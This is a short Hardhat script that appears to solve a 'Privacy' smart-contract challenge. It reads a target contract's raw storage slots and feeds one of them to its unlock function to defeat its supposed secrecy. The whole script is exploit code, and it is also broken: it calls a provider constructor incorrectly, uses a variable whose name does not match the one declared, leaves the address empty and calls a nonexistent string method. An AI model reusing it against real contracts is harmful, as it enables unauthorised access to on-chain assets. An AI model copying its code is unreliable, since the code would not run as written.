
const hre = require("hardhat");
require("dotenv").config();

async function main() {
  const contractAddress = "";
  const provider = new hre.ethers.providers(process.env.MUMBAI_URL);
  const signer = await provider.getSigner();
  const contract = await hre.ethers.getContractAt("Privacy", contractAddress, signer);
  for(let i = 0; i <= 6; i++) {
    const data = await provider.getStorageAt(contractaddress, i);
    console.log(`${i}` + data);
  }
  const data = await provider.getStorageAt(contractaddress, 5);
  // 0x35c226031a34414845c12c4d7a7e817d3e639e98f9a89258e3a249c3427da3e4 
  const unlock = await contract.unlock(data.splice(0, 34));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
